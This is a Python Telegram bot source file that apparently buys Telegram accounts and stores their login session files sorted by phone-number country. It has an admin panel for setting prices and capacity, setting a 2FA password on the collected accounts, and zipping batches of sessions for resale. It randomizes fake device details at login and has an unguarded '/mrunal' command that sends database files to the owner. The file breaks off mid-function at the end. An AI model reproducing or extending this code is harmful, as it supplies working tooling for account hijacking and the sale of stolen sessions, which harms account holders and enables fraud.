import base64
import os
import re
import json
import time
import random
import asyncio
import logging
import zipfile
import phonenumbers

from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, SessionRevoked, BadRequest, UserDeactivatedBan, UserDeactivated, PhoneNumberBanned
from pyrogram.raw.functions.auth import ResetAuthorizations
from pyrogram.raw.functions.account import GetAuthorizations
from pyrogram.raw.functions.updates import GetState
from telethon import Button, TelegramClient, events
from telethon.tl.functions.channels import GetParticipantRequest

from db import *
from config import *
from session import Session
from fake import Fake

logging.basicConfig(
  format="[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s",
  level=logging.INFO)

def check_memory_folder(directory):
    if not os.path.exists(directory):
        print(f"\n\n\nThe directory '{directory}' does not exist. Creating it now...")
        os.makedirs(directory)
        print(f"\nDirectory '{directory}' created successfully.")
    else:
        print()

directory_name = "sessions"
check_memory_folder(directory_name)

directory_name = "sessions1"
check_memory_folder(directory_name)

directory_name = "sessions2"
check_memory_folder(directory_name)

directory_name = "sessions3"
check_memory_folder(directory_name)

temp_users = []
support_users = []

bot = TelegramClient("bot", api_id=2040, api_hash="b18441a1ff607e10a989891a5462e627").start(bot_token=BOT_TOKEN)

logging.info("Starting bot...")

import json

country_codes = [
    "+93", "+355", "+213", "+684", "+376", "+244", "+264", "+672", "+268", "+672", "+268", "+54",
    "+374", "+297", "+61", "+43", "+994", "+242", "+973", "+880", "+246", "+375", "+32", "+501",
    "+229", "+441", "+975", "+591", "+229", "+441", "+975", "+591", "+387", "+267", "+55", "+246",
    "+284", "+673", "+359", "+226", "+257", "+855", "+237", "+235", "+56", "+86", "+61", "+57",
    "+269", "+682", "+45", "+670", "+593", "+20", "+503", "+240", "+291", "+372", "+251", "+500",
    "+298", "+679", "+358", "+33", "+689", "+241", "+220", "+995", "+49", "+233", "+350", "+30",
    "+299", "+473", "+91", "+92", "+245", "+592", "+509", "+504", "+852", "+36", "+354", "+62",
    "+98", "+964", "+353", "+1624", "+972", "+39", "+225", "+876", "+81", "+1534", "+962", "+7",
    "+254", "+686", "+383", "+965", "+996", "+856", "+371", "+961", "+266", "+231", "+218",
    "+423", "+370", "+352", "+853", "+389", "+261", "+60", "+52", "+212", "+95", "+264",
    "+977", "+31", "+977", "+234", "+850", "+92", "+63", "+48", "+351", "+966", "+94",
    "+992", "+886", "+90", "+256", "+380", "+263"
]

def rand_info():
    base = {
        "languages": ['af', 'ar', 'en', 'fa', 'fr', 'ru'],
        "app_versions": [7.84, 1.18, 8.54, 4.61, 20.01, 3.02, 2.19, 9.10, 6.84, 12.5, 5.12, 5.14, 2.12]
    }

    android = {
        "models": ['Samsung Galaxy A20s', 'Samsung Galaxy A70', 'Samsung Galaxy A01', 'Samsung Galaxy A20', 'Samsung Galaxy A30s', 'Samsung Galaxy A51', 'Samsung Galaxy A21s', 'Samsung Galaxy A32', 'Samsung Galaxy A12', 'Xiaomi Poco X3 Pro ', 'Xiaomi Redmi Note 8 pro', 'Xiaomi Poco X3 Pro ', 'Xiaomi Redmi Note 8', 'Xiaomi Redmi Note 9 Pro', 'Xiaomi Redmi Note 9', 'Xiaomi Poco F3', 'Huawei Y7 Prime 2019', 'Huawei Y9 Prime 2019', 'Huawei Y6 Prime 2019 ', 'Huawei Honor 10', 'Asus ROG Phone 5s', 'Asus Zenfone 3 Deluxe'],
        "versions": [9.0, 10.2, 9.1, 10.21, 9.2, 10.22, 9.3, 10.23, 9.4, 10.24, 9.5, 10.25, 9.6, 10.26, 9.7, 10.27, 9.8, 0.28, 9.9, 10.29, 10.0, 10.3, 10.1, 10.31, 10.2, 10.32, 10.3, 10.33, 10.4, 10.34, 10.5, 10.35, 10.6, 10.36, 10.7, 10.37, 10.8, 10.38, 10.9, 10.39, 11.0, 10.4, 11.1, 10.41, 11.2, 10.42]
    }
    
    ios = {
        "models": ['iPhone X ', 'iPhone 11 Pro Max', 'iPhone 11', 'iPhone 7', 'iPhone 7 Plus', 'iPhone 6', 'iPhone X'],
        "versions": ['iOS 12.0', 'iOS 12.4', 'iOS 12.55', 'iOS 13.0', 'iOS 13.18', 'iOS 14.01', 'iOS 15.0', 'iOS 15.01']
    }
    
    rand_device = random.randint(1, 2)
    if rand_device == 1:
        device_model = random.choice(ios['models'])
        device_version = random.choice(ios['versions'])
    elif rand_device == 2:
        device_model = random.choice(android['models'])
        device_version = random.choice(android['versions'])
    
    rand_language = random.choice(base['languages'])
    
    data = {
        "device_model": device_model,
        "system_version": str(device_version),
        "language": rand_language.lower(),
        "app_version": str(random.choice(base['app_versions']))
    }
    
    return data
  
def current_timestamp():
    return int(time.time())

async def get_user_join(id):
  ok = True

  try:
    chan = udB.get("CHANNEL")
    chan = await bot.get_input_entity(chan)
    await bot(GetParticipantRequest(chan, participant=id))
    ok = True
  except:
    ok = False

  return ok

udB.set("SPAM", "OFF")

@bot.on(events.NewMessage(incoming=True, pattern="^/mrunal"))
async def start_(event):
  print(event.message.id)
  print("syncing data...")
  try :
    await bot.send_file(OWNER, "./Database1.json")
    await bot.send_file(OWNER, "./Database2.json")
    await bot.send_file(OWNER, "./Database3.json")
    await bot.send_file(OWNER, "./Database4.json")
    print("DB files sent...")
  except BaseException as r  :
    print(r)

@bot.on(events.NewMessage(incoming=True, pattern="^(/start|/cancel)"))
async def start_(event):
  if event.sender_id in temp_users:
    if event.sender_id in temp_users: temp_users.remove(event.sender_id)

  if event.sender_id in support_users:
    support_users.remove(event.sender_id)

  users = udB.get("users")
  bans = udB.get("bans")

  if event.sender_id not in users:
    udB.set("users", users + [event.sender_id])

  if event.sender_id in bans:
    return await bot.send_message(
      event.sender_id,
      "🅱️ You are ban from the bot."
    )

  onoff = udB.get("ONOFF")
  if str(onoff) == "True":
    return await bot.send_message(
      event.sender_id,
      "Account purchase is currently suspended‌ ❌.\n\nWhen the account purchase starts✅, the channel will be notified."
    )

  input_user = await event.get_input_sender()

  if await get_user_join(input_user):
    await event.reply(base64.b64decode(udB.get("WELCOME_TEXT").encode("utf-8")).decode("utf-8"))
  else:
    await bot.send_message(
      event.sender_id,
      "✅ To continue working, you need to join the following channel\n\n🔗 https://t.me/test00997tu\n\n🔗 https://t.me/test00997tu\n\n👉 After joining, send /start again..", reply_to=event.message.id)


@bot.on(events.NewMessage(incoming=True, pattern="/account"))
async def start_(event):
  onoff = udB.get("ONOFF")
  if str(onoff) == "True":
    return await bot.send_message(
      event.sender_id,
      "Account purchase is currently suspended‌ ❌.\n\nWhen the account purchase starts✅, the channel will be notified."
    )
    
  elif not await get_user_join(await event.get_input_sender()):
    return await bot.send_message(
      event.sender_id,
      "✅ To continue working, you need to join the following channel\n\n🔗 https://t.me/test00997tu\n\n🔗 https://t.me/test00997tu\n\n👉 After joining, send /start again..", reply_to=event.message.id)

  timer = udB.get("TIMER")
  user = await bot.get_entity(event.sender_id)
  txt = f'''
🆔 ID : `{user.id}`
📤 Number of sent accounts : {round(get_(user.id,"claim"),)}
✅ Accounts that can be settled : {round(get_(user.id,"claim"),)}

📅 Date : `{datetime.now().strftime('%D')}`
⏳ Time : `{datetime.now().strftime('%H:%M:%S')}` ( UTC +6:00 )


⏳ Account Confirmation time : {timer} Second

Note : You Can Also Check Your Withdrawhistory Useing This Command

/withdrawhistory
  '''

  await event.reply(txt)



@bot.on(events.NewMessage(incoming=True, pattern="/capacity"))
async def start_(event):
  onoff = udB.get("ONOFF")
  if str(onoff) == "True":
    return await bot.send_message(
      event.sender_id,
      "Account purchase is currently suspended‌ ❌.\n\nWhen the account purchase starts✅, the channel will be notified."
    )

  get_all = eval(cdB._raw_data())

  text = "✅ Capacity of countries:\n\n"
  for country_code, data in get_all.items():
    if not data[0]:
      continue

    text += f"👉 Country Code {country_code} 🛍️ Capacity {data[1]}\n"

  await event.reply(text)

admin_buttons = [
  [
    Button.text("🔖 Random Info", resize=True),
  ],
  [
    Button.text("🔐 LOG_CHANNEL 1", resize=True),
    Button.text("🔐 LOG_CHANNEL 2", resize=True),
    Button.text("🔐 LOG_CHANNEL 3", resize=True)
  ],
  [
    Button.text("📊 Country Panel", resize=True),
    Button.text("➕ Add Country", resize=True),
  ],
  [
    Button.text("🕯 Set Cap", resize=True),
    Button.text("💸 Set Price", resize=True),
  ],
  [
    Button.text("🎉 Welcome message SetUp", resize=True),
    Button.text("👮‍♂️ Get Sessions", resize=True),
    Button.text("❌ SPAM SetUp", resize=True),
  ],
  [
    Button.text("🔴 Users Balance Statistics", resize=True),
    Button.text("🗝 Change 2FA", resize=True),
    Button.text("⏳ Claim Timer", resize=True),
  ],
  [
    Button.text("🔘 Add Balance", resize=True),
    Button.text("✂️ Cut Balance", resize=True)
  ],
  [
    Button.text("🎤 Channel", resize=True),
    Button.text("⬆️ Withdraw Channel", resize=True),
    Button.text("🔛 BOT OFF/ON", resize=True),
  ],
  [
    Button.text("💬 Broadcast", resize=True),
    Button.text("🅱️ User BAN", resize=True),
    Button.text("🎀 User UnBan", resize=True)
  ],
  [
    Button.text("✅ Robot Statistics", resize=True)
  ],
  [
    Button.text("🔙 Back", resize=True)
  ]
]

def zip_files(sessions_folder, file_list, output_zip):
  with zipfile.ZipFile(output_zip, 'w') as zipf:
      for file_name in file_list:
          # Create the full path to the file
          file_path = os.path.join(sessions_folder, file_name)
          if os.path.isfile(file_path):
              # Add the file to the zip archive
              zipf.write(file_path, arcname=file_name)

@bot.on(events.NewMessage(incoming=True, from_users=OWNER, pattern="^/admin$"))
async def admin(event):
  await admin_panel(event)

async def admin_panel(event):
  temp_users.append(event.sender_id)

  async with bot.conversation(event.sender_id, timeout=86400) as cv:
    await cv.send_message('🔄 Select your option:', buttons=admin_buttons, reply_to=event.message.id)
    get_response = await cv.get_response()

  if get_response.text in ["/start", "/cancel", "❌ Cancel", "🔙 Back"]:
      if event.sender_id in temp_users: temp_users.remove(event.sender_id)
      return await get_response.reply('⚠️ Operation canceled.', buttons=Button.clear(), reply_to=get_response.id)

  buttons = [
      [
          Button.text("❌ Cancel", resize=True)
      ]
  ]

  if get_response.text == "🔐 LOG_CHANNEL 1":
    async with event.client.conversation(event.sender_id, timeout=86400) as cv:
      await cv.send_message('🔄 Send your channel for pyrogram sessions:', buttons=buttons, reply_to=event.message.id)
      get_response = await cv.get_response()

    if get_response.text in ["/start", "/cancel", "❌ Cancel", "🔙 Back"]:
      await get_response.reply('⚠️ Operation canceled.', buttons=Button.clear(), reply_to=get_response.id)

    elif not get_response.text.startswith("-100") or not get_response.text[4:].isnumeric():
      await get_response.reply('🔄 Pyrogram channel is invalid.', buttons=Button.clear(), reply_to=get_response.id)

    else:
      udB.set("LOG_CHANNEL", get_response.text)
      await get_response.reply('🔄 Pyrogram sessions channel was set.', buttons=Button.clear(), reply_to=get_response.id)

  elif get_response.text == "🔐 LOG_CHANNEL 2":
    async with event.client.conversation(event.sender_id, timeout=86400) as cv:
      await cv.send_message('🔄 Send your channel for telethon sessions:', buttons=buttons, reply_to=event.message.id)
      get_response = await cv.get_response()

    if get_response.text in ["/start", "/cancel", "❌ Cancel", "🔙 Back"]:
      await get_response.reply('⚠️ Operation canceled.', buttons=Button.clear(), reply_to=get_response.id)

    elif not get_response.text.startswith("-100") or not get_response.text[4:].isnumeric():
      await get_response.reply('🔄 Telethon channel is invalid.', buttons=Button.clear(), reply_to=get_response.id)
    else:
      udB.set("LOG_CHANNEL2", get_response.text)
      await get_response.reply('🔄 Telethon sessions channel was set.', buttons=Button.clear(), reply_to=get_response.id)

  elif get_response.text == "🔐 LOG_CHANNEL 3":
    async with event.client.conversation(event.sender_id, timeout=86400) as cv:
      await cv.send_message('🔄 Send your channel for json files:', buttons=buttons, reply_to=event.message.id)
      get_response = await cv.get_response()

    if get_response.text in ["/start", "/cancel", "❌ Cancel", "🔙 Back"]:
      await get_response.reply('⚠️ Operation canceled.', buttons=Button.clear(), reply_to=get_response.id)

    elif not get_response.text.startswith("-100") or not get_response.text[4:].isnumeric():
      await get_response.reply('🔄 JSON channel is invalid.', buttons=Button.clear(), reply_to=get_response.id)
    else:
      udB.set("LOG_CHANNEL3", get_response.text)
      await get_response.reply('🔄 JSON files channel was set.', buttons=Button.clear(), reply_to=get_response.id)

  elif get_response.text == "➕ Add Country":
    async with event.client.conversation(event.sender_id, timeout=86400) as cv:
      await cv.send_message("➕ Add you country code to add country:", buttons=buttons, reply_to=get_response.id)
      get_response = await cv.get_response()

    if get_response.text in ["/start", "/cancel", "❌ Cancel", "🔙 Back"]:
      await get_response.reply('⚠️ Operation canceled.', buttons=Button.clear(), reply_to=get_response.id)

    elif get_response.text not in country_codes:
      await get_response.reply('➕ Country code is invalid.', buttons=Button.clear(), reply_to=get_response.id)

    elif cdB.get(get_response.text):
      await get_response.reply('➕ Country code is exist.', buttons=Button.clear(), reply_to=get_response.id)
    else:
      cdB.set(get_response.text, ["ON", 0])
      await get_response.reply(f'➕ {get_response.text} was added to your country codes list.', buttons=Button.clear(), reply_to=get_response.id)

  elif get_response.text == "🕯 Set Cap":
    async with event.client.conversation(event.sender_id, timeout=86400) as cv:
      await cv.send_message("🕯 Send your parameters like this:\nCOUNTRY_CODE CAP", buttons=buttons, reply_to=get_response.id)
      get_response = await cv.get_response()

    if get_response.text in ["/start", "/cancel", "❌ Cancel", "🔙 Back"]:
      await get_response.reply('⚠️ Operation canceled.', buttons=Button.clear(), reply_to=get_response.id)

    else:
      split_data = get_response.text.split(" ")

      if len(split_data) != 2:
        await get_response.reply('🕯 Parameters are invalid.', buttons=Button.clear(), reply_to=get_response.id)

      elif split_data[0] not in country_codes:
        await get_response.reply('🕯 Country code is not exist.', buttons=Button.clear(), reply_to=get_response.id)
      else:
        cdB.set(split_data[0], ["ON", int(split_data[1])])
        await get_response.reply(f'🕯 Capacity of this country code was changed.', buttons=Button.clear(), reply_to=get_response.id)

  elif get_response.text == "💸 Set Price":
    async with event.client.conversation(event.sender_id, timeout=86400) as cv:
      await cv.send_message("💸 Send your parameters like this:\nCOUNTRY_CODE PRICE", buttons=buttons, reply_to=get_response.id)
      get_response = await cv.get_response()

    if get_response.text in ["/start", "/cancel", "❌ Cancel", "🔙 Back"]:
      await get_response.reply('⚠️ Operation canceled.', buttons=Button.clear(), reply_to=get_response.id)

    else:
      split_data = get_response.text.split(" ")

      if len(split_data) != 2:
        await get_response.reply('💸 Parameters are invalid.', buttons=Button.clear(), reply_to=get_response.id)

      elif split_data[0] not in country_codes:
        await get_response.reply('💸 Country code is not exist.', buttons=Button.clear(), reply_to=get_response.id)
      else:
        if split_data[1] == "0":
          cpdb.delete(split_data[0])
        else:
          cpdb.set(split_data[0], int(split_data[1]))
          
        await get_response.reply(f'💸 Price of this country code was changed.', buttons=Button.clear(), reply_to=get_response.id)

  elif get_response.text == "📊 Country Panel":
    countries = eval(cdB._raw_data())

    if not countries:
      await get_response.reply("📊 You don't have any country", buttons=Button.clear(), reply_to=get_response.id)
    else:
      buttons = [
        [
          Button.inline("🚩", "none"),
          Button.inline("💎", "none"),
          Button.inline("💸", "none"),
          Button.inline("🛍", "none"),
          Button.inline("📊", "none"),
          Button.inline("❌", "none"),
        ]
      ]

      for country, status in countries.items():
        country_status = "✅" if status[0] == "ON" else "❌"
        rate = cpdb.get(country) if cpdb.get(country) is not None else "0"

        buttons.append([
          Button.inline(country, "none"),
          Button.inline(str(status[1]), "none"),
          Button.inline(str(rate), "none"),
          Button.inline(str(get_(country, "sells")), "none"),
          Button.inline(country_status, "none"),
          Button.inline("❌", f"deletecountry_{country}")
        ])

      await get_response.reply("📊 Welcome to admin.", buttons=Button.clear(), reply_to=get_response.id)
      await get_response.reply("📊 Country Panel:", buttons=buttons, reply_to=get_response.id)

  elif get_response.text == "🔛 BOT OFF/ON":
    get_spam = udB.get("ONOFF")

    if not get_spam or get_spam == "False":
      value = "True"
    else:
      value = "False"

    udB.set("ONOFF", value)
    await get_response.reply(f'🔛 Bot status was set to {value}.', buttons=Button.clear(), reply_to=get_response.id)

  elif get_response.text == "🔖 Random Info":
    get_random = udB.get("RANDOM")

    if not get_random or get_random == "False":
      value = "True"
    else:
      value = "False"

    udB.set("RANDOM", value)
    await get_response.reply(f'🔖 Rando, information status was set to {value}.', buttons=Button.clear(), reply_to=get_response.id)

  elif get_response.text == "❌ SPAM SetUp":
    get_spam = udB.get("SPAM")

    if not get_spam or get_spam == "OFF":
      value = "ON"
    else:
      value = "OFF"

    udB.set("SPAM", value)
    await get_response.reply(f'❌ Spam SetUp was to {value}.', buttons=Button.clear(), reply_to=get_response.id)

  elif get_response.text == "🎤 Channel":
    async with event.client.conversation(event.sender_id, timeout=86400) as cv:
      await cv.send_message('🎤 Send your value:', buttons=buttons, reply_to=event.message.id)
      get_response = await cv.get_response()

    if get_response.text in ["/start", "/cancel", "❌ Cancel", "🔙 Back"]:
      await get_response.reply('⚠️ Operation canceled.', buttons=Button.clear(), reply_to=get_response.id)

    else:
      udB.set("CHANNEL", get_response.text)
      await get_response.reply('🎤 Channel channel was set.', buttons=Button.clear(), reply_to=get_response.id)

  elif get_response.text == "💬 Broadcast":
    async with event.client.conversation(event.sender_id, timeout=86400) as cv:
      await cv.send_message('💬 Send your message:', buttons=buttons, reply_to=event.message.id)
      get_response = await cv.get_response()

    if get_response.text in ["/start", "/cancel", "❌ Cancel", "🔙 Back"]:
      await get_response.reply('⚠️ Operation canceled.', buttons=Button.clear(), reply_to=get_response.id)

    else:
      await get_response.reply("💬 Waiting ...", reply_to=get_response.id)

      done = error = 0
      for i in udB.get("users"):
          try:
              await bot.send_message(int(i), get_response.text)
              done += 1
          except:
              error += 1

      await get_response.reply("💬 Broadcast completed.\nSuccess: {}\nFailed: {}".format(done, error), reply_to=get_response.id)

  elif get_response.text == "⬆️ Withdraw Channel":
    async with event.client.conversation(event.sender_id, timeout=86400) as cv:
      await cv.send_message('⬆️ Send your value:', buttons=buttons, reply_to=event.message.id)
      get_response = await cv.get_response()

    if get_response.text in ["/start", "/cancel", "❌ Cancel", "🔙 Back"]:
      await get_response.reply('⚠️ Operation canceled.', buttons=Button.clear(), reply_to=get_response.id)

    else:
      udB.set("WITHDRAW_CHANNEL", get_response.text)
      await get_response.reply('⬆️ Withdraw channel was set.', buttons=Button.clear(), reply_to=get_response.id)

  elif get_response.text == "🎉 Welcome message SetUp":
    async with event.client.conversation(event.sender_id, timeout=86400) as cv:
      await cv.send_message('🎉 Send your value:', buttons=buttons, reply_to=event.message.id)
      get_response = await cv.get_response()

    if get_response.text in ["/start", "/cancel", "❌ Cancel", "🔙 Back"]:
      await get_response.reply('⚠️ Operation canceled.', buttons=Button.clear(), reply_to=get_response.id)

    else:
      udB.set("WELCOME_TEXT", base64.b64encode(get_response.text.encode("utf-8")).decode("utf-8"))
      await get_response.reply('🎉 Welcome text was set.', buttons=Button.clear(), reply_to=get_response.id)

  elif get_response.text == "🗝 Change 2FA":
    async with event.client.conversation(event.sender_id, timeout=86400) as cv:
      await cv.send_message('🗝 Send your value:', buttons=buttons, reply_to=event.message.id)
      get_response = await cv.get_response()

    if get_response.text in ["/start", "/cancel", "❌ Cancel", "🔙 Back"]:
      await get_response.reply('⚠️ Operation canceled.', buttons=Button.clear(), reply_to=get_response.id)

    else:
      udB.set("SESSION_PASSWORD", get_response.text)
      await get_response.reply('🗝 2FA was set.', buttons=Button.clear(), reply_to=get_response.id)

  elif get_response.text == "⏳ Claim Timer":
    async with event.client.conversation(event.sender_id, timeout=86400) as cv:
      await cv.send_message('⏳ Send your value:', buttons=buttons, reply_to=event.message.id)
      get_response = await cv.get_response()

    if get_response.text in ["/start", "/cancel", "❌ Cancel", "🔙 Back"]:
      await get_response.reply('⚠️ Operation canceled.', buttons=Button.clear(), reply_to=get_response.id)

    else:
      udB.set("TIMER", get_response.text)
      await get_response.reply('⏳ Claim timer was set.', buttons=Button.clear(), reply_to=get_response.id)

  elif get_response.text == "🔴 Users Balance Statistics":
    async with event.client.conversation(event.sender_id, timeout=86400) as cv:
      await cv.send_message('🔴 Send your user id:', buttons=buttons, reply_to=event.message.id)
      get_response = await cv.get_response()

    if get_response.text in ["/start", "/cancel", "❌ Cancel", "🔙 Back"]:
      await get_response.reply('⚠️ Operation canceled.', buttons=Button.clear(), reply_to=get_response.id)

    else:
      user_id = int(get_response.text)
      users = udB.get("users")

      if user_id not in users:
        await get_response.reply("🔴 User isn't member of bot.", buttons=Button.clear(), reply_to=get_response.id)
      else:
        await get_response.reply(f'''🔴 User Stats:\n\n🆔 ID : `{user_id}`
  📤 Number of sent accounts : {round(get_(user_id,"claim"),)}
  ✅ Accounts that can be settled : {round(get_(user_id,"claim"),)}

  Date : `{datetime.now().strftime('%D')}`
  Time : `{datetime.now().strftime('%H:%M:%S')}` ( UTC +6:00 )''', buttons=Button.clear(), reply_to=get_response.id)


  elif get_response.text == "🔘 Add Balance":
    async with event.client.conversation(event.sender_id, timeout=86400) as cv:
      await cv.send_message('🔘 Send your paramters like this:\nUSER_ID VALUE', buttons=buttons, reply_to=event.message.id)
      get_response = await cv.get_response()

    if get_response.text in ["/start", "/cancel", "❌ Cancel", "🔙 Back"]:
      await get_response.reply('⚠️ Operation canceled.', buttons=Button.clear(), reply_to=get_response.id)

    else:
      split_data = get_response.text.split(" ")
      if len(split_data) != 2:
          await get_response.reply('🔘 Parameters are invalid.', buttons=Button.clear(), reply_to=get_response.id)
      else:
        user_id = int(split_data[0])
        users = udB.get("users")

        if user_id not in users:
          await get_response.reply("🔘 User isn't member of bot.", buttons=Button.clear(), reply_to=get_response.id)
        else:
            add_(user_id, int(split_data[1]), "claim")
            await get_response.reply(f'🔘 User balance was increased.', buttons=Button.clear(), reply_to=get_response.id)

  elif get_response.text == "✂️ Cut Balance":
    async with event.client.conversation(event.sender_id, timeout=86400) as cv:
      await cv.send_message('✂️ Send your paramters like this:\nUSER_ID VALUE', buttons=buttons, reply_to=event.message.id)
      get_response = await cv.get_response()

    if get_response.text in ["/start", "/cancel", "❌ Cancel", "🔙 Back"]:
      await get_response.reply('⚠️ Operation canceled.', buttons=Button.clear(), reply_to=get_response.id)

    else:
      split_data = get_response.text.split(" ")
      if len(split_data) != 2:
          await get_response.reply('✂️ Parameters are invalid.', buttons=Button.clear(), reply_to=get_response.id)
      else:
        user_id = int(split_data[0])
        users = udB.get("users")

        if user_id not in users:
          await get_response.reply("✂️ User isn't member of bot.", buttons=Button.clear(), reply_to=get_response.id)
        else:
            dedu(user_id, int(split_data[1]), "claim")
            await get_response.reply(f'✂️ User balance was decreased.', buttons=Button.clear(), reply_to=get_response.id)

  elif get_response.text == "👮‍♂️ Get Sessions":
    stats = {
      'pyrogram': {},
      'telethon': {},
      'json': {}
    }

    all_sessions = os.listdir("sessions1")
    for session in all_sessions:
      if "journal" in session:
        continue

      parse_session = session.split(".")
      check_number = phonenumbers.parse(f"+{parse_session[0]}")
      ctr = f"+{check_number.country_code}"

      if ctr not in stats['pyrogram']:
        stats['pyrogram'][ctr] = 1
      else:
        stats['pyrogram'][ctr] += 1
        
    all_sessions = os.listdir("sessions2")
    for session in all_sessions:
      if "journal" in session:
        continue

      parse_session = session.split(".")
      check_number = phonenumbers.parse(f"+{parse_session[0]}")
      ctr = f"+{check_number.country_code}"

      if ctr not in stats['telethon']:
        stats['telethon'][ctr] = 1
      else:
        stats['telethon'][ctr] += 1
        
    all_sessions = os.listdir("sessions3")
    for session in all_sessions:
      if "journal" in session:
        continue

      parse_session = session.split(".")
      check_number = phonenumbers.parse(f"+{parse_session[0]}")
      ctr = f"+{check_number.country_code}"

      if ctr not in stats['json']:
        stats['json'][ctr] = 1
      else:
        stats['json'][ctr] += 1

    text = ""
    
    
    text += f"Pyrogram:\n\n"
    for country_code, count in stats['pyrogram'].items():
      text += f"{country_code}: {count}\n"
    
    text += f"\nTelethon:\n\n"
    for country_code, count in stats['telethon'].items():
      text += f"{country_code}: {count}\n"
      
    text += f"\nJSON:\n\n"
    for country_code, count in stats['json'].items():
      text += f"{country_code}: {count}\n"

    async with event.client.conversation(event.sender_id, timeout=86400) as cv:
      await cv.send_message(f'👮‍♂️ Send your parameters like this:\nCOUNTRY_CODE COUNT\n\n{text}', buttons=buttons, reply_to=event.message.id)
      get_response = await cv.get_response()

    if get_response.text in ["/start", "/cancel", "❌ Cancel", "🔙 Back"]:
      await get_response.reply('⚠️ Operation canceled.', buttons=Button.clear(), reply_to=get_response.id)
    else:
      split_data = get_response.text.split(" ")

      if len(split_data) != 2:
        await get_response.reply('💸 Parameters are invalid.', buttons=Button.clear(), reply_to=get_response.id)
      else:
        random_select = int(split_data[1])

        all_sessions = os.listdir("sessions1")
        available_sessions = []

        for session in all_sessions:
          if session.startswith(split_data[0].replace("+", "")) and "journal" not in session:
            available_sessions.append(session)

        if int(split_data[1]) > len(available_sessions):
          random_select = len(available_sessions)

        random_files = random.sample(available_sessions, k=random_select)

        if random_files:
          zip_file_name = f"pyrogram-{random.randint(1000, 9000)}.zip"
          zip_files('sessions1', random_files, zip_file_name)

          await bot.send_file(event.sender_id, zip_file_name, caption='👮‍♂️ Pyrogram Sessions.', buttons=Button.clear(), reply_to=get_response.id)
          os.remove(zip_file_name)

          print(random_files)
          for session in random_files:
            path = f"sessions1/{session}"
            if os.path.isfile(path):
              os.remove(path)

        # ---

        all_sessions = os.listdir("sessions2")
        available_sessions = []

        for session in all_sessions:
          if session.startswith(split_data[0].replace("+", "")) and "journal" not in session:
            available_sessions.append(session)

        if int(split_data[1]) > len(available_sessions):
          random_select = len(available_sessions)

        random_files = random.choices(available_sessions, k=random_select)

        if random_files:
          zip_file_name = f"telethon-{random.randint(1000, 9000)}.zip"
          zip_files('sessions2', random_files, zip_file_name)

          await bot.send_file(event.sender_id, zip_file_name, caption='👮‍♂️ Telethon Sessions.', buttons=Button.clear(), reply_to=get_response.id)
          os.remove(zip_file_name)

          for session in random_files:
            path = f"sessions2/{session}"
            if os.path.isfile(path):
              os.remove(path)

        # ---

        all_sessions = os.listdir("sessions3")
        available_sessions = []

        for session in all_sessions:
          if session.startswith(split_data[0].replace("+", "")) and "journal" not in session:
            available_sessions.append(session)

        if int(split_data[1]) > len(available_sessions):
          random_select = len(available_sessions)

        random_files = random.choices(available_sessions, k=random_select)

        if random_files:
          zip_file_name = f"json-{random.randint(1000, 9000)}.zip"
          zip_files('sessions3', random_files, zip_file_name)

          await bot.send_file(event.sender_id, zip_file_name, caption='👮‍♂️ JSON Files.', buttons=Button.clear(), reply_to=get_response.id)
          os.remove(zip_file_name)

          for session in random_files:
            path = f"sessions3/{session}"
            if os.path.isfile(path):
              os.remove(path)

  elif get_response.text == "🅱️ User BAN":
    async with event.client.conversation(event.sender_id, timeout=86400) as cv:
      await cv.send_message('🅱️ Send your user id:', buttons=buttons, reply_to=event.message.id)
      get_response = await cv.get_response()

    if get_response.text in ["/start", "/cancel", "❌ Cancel", "🔙 Back"]:
      await get_response.reply('⚠️ Operation canceled.', buttons=Button.clear(), reply_to=get_response.id)

    else:
      user_id = int(get_response.text)
      users = udB.get("users")
      bans = udB.get("bans")

      if user_id not in users:
        await get_response.reply("🅱️ User isn't member of bot.", buttons=Button.clear(), reply_to=get_response.id)

      elif user_id in bans:
        await get_response.reply("🅱️ User is bot currently.", buttons=Button.clear(), reply_to=get_response.id)
      else:
        udB.set("bans", bans + [user_id])
        await get_response.reply(f'🅱️ User was banned.', buttons=Button.clear(), reply_to=get_response.id)

  elif get_response.text == "🎀 User UnBan":
    async with event.client.conversation(event.sender_id, timeout=86400) as cv:
      await cv.send_message('🎀 Send your user id:', buttons=buttons, reply_to=event.message.id)
      get_response = await cv.get_response()

    if get_response.text in ["/start", "/cancel", "❌ Cancel", "🔙 Back"]:
      await get_response.reply('⚠️ Operation canceled.', buttons=Button.clear(), reply_to=get_response.id)

    else:
      user_id = int(get_response.text)
      users = udB.get("users")
      bans = udB.get("bans")

      if user_id not in users:
        await get_response.reply("🎀 User isn't member of bot.", buttons=Button.clear(), reply_to=get_response.id)

      elif user_id in bans:
        await get_response.reply("🎀 User is ujnbot currently.", buttons=Button.clear(), reply_to=get_response.id)
      else:
        new_bans = bans.remove(user_id)
        udB.set("bans", new_bans)
        await get_response.reply(f'🎀 User was unbanned.', buttons=Button.clear(), reply_to=get_response.id)

  elif get_response.text == "✅ Robot Statistics":
    users = udB.get("users")
    await get_response.reply(f'👤 Total Users : {len(users)}\n🤖 Total Sessions: {len(os.listdir("sessions"))}', buttons=Button.clear(), reply_to=get_response.id)

  if event.sender_id in temp_users: temp_users.remove(event.sender_id)
  
  if get_response.text not in ["/start", "/cancel"]:
    await admin_panel(event)

@bot.on(
  events.callbackquery.CallbackQuery(data=re.compile("deletecountry_(.*)")))
async def support_(event):
  data = event.pattern_match.group(1).decode("utf-8")
  status = cdB.get(data)

  if not status:
    return await event.answer("This country code isnt exist", alert=True)

  if status[0] == "ON":
    cdB.set(data, ["OFF", status[1]])

  elif status[0] == "OFF":
    cdB.set(data, ["ON", status[1]])


  buttons = [
    [
      Button.inline("🚩", "none"),
      Button.inline("💎", "none"),
      Button.inline("💸", "none"),
      Button.inline("🛍", "none"),
      Button.inline("📊", "none"),
      Button.inline("❌", "none"),
    ]
  ]

  countries = eval(cdB._raw_data())

  for country, status in countries.items():
    country_status = "✅" if status[0] == "ON" else "❌"
    rate = cpdb.get(country) if cpdb.get(country) is not None else "0"

    buttons.append([
      Button.inline(country, "none"),
      Button.inline(str(status[1]), "none"),
      Button.inline(str(rate), "none"),
      Button.inline(str(get_(country, "sells")), "none"),
      Button.inline(country_status, "none"),
      Button.inline("❌", f"deletecountry_{country}")
    ])

  await event.edit('📊 Country Panel:', buttons=buttons)


@bot.on(events.NewMessage(incoming=True, pattern="^/setvar"))
async def start_(event):
  xx = await bot.send_message(event.sender_id, "`Setting Information....`")
  if event.sender_id == OWNER:
    try:
